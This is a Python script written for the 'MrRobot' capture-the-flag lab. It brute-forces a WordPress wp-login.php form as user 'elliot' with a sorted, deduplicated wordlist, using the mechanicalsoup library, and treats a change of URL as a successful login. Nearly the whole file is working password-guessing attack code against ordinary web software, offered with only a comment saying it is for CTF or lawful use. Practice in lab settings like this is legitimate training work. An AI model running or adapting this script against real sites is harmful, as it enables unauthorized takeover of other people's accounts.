"""
    Title:     BruteForce.py
    Author:    @WallStCrash  
    Date:      2.11.2021
    
    Purpose:   This is a Python script created to brute-force the login for
               the WordPress login on the "MrRobot" CTF. The Password list is
               taken from the fsocity.dic (.txt) file we obtained earlier
               with <wget> command on the robots.txt URL.The raw fscoity.dic
               file was very large at ~7.2MB, so I sorted (using <sort>)
               and removed duplicates (using <uniq>) from the file and saved
               this as a file "uniqueSorted.txt" which reduced the size 
               of the file down to ~96kB. ***This should not be used for 
               anything other than CTF challenges or law abiding purposes***
    
    Notes:     This loop makes the assumption that when the successful
               password has been submitted that the URL will change. 
               There is one potential issue with this: the URL may
               change after a certain number of incorrect attempts
               leading to a false-positive result for the password.
                    
               So, not necessarily a foolproof method.
               
               Documentation as for the mechanicalsoup package here:
               https://mechanicalsoup.readthedocs.io/en/stable/tutorial.html
"""

# Import necessary package
import mechanicalsoup as ms

# Create the browser object called from ms
browser = ms.StatefulBrowser()

# Define our password list as the uniqueSorted.txt file include full path to file incase Python was not launched from that directory
passwords = open(
	"/root/Desktop/Capture_the_Flag/MrRobot/uniqueSorted.txt", "r")

# Let us open up the appropriate webpage we need, as this is the basis for our if condition inequality let us also define this page as check here
check = "http://IP-ADDRESS-FOR-YOUR-TARGET-MACHINE/wp-login.php"
browser.open(check)

# We have confirmed the username "elliot" is correct this does not need to change so we can pull this out of the loop
browser.select_form()
browser["log"] = "elliot"


def brute_force():
	for pwd in passwords:

		print("Attempting password: " + pwd)
		browser.select_form()
		browser["pwd"] = pwd
		browser.submit_selected()
		resp = browser.url

		if check != resp:
			break

	print("Potential password found!" + "\n" + "Try using: " + pwd)

brute_force()
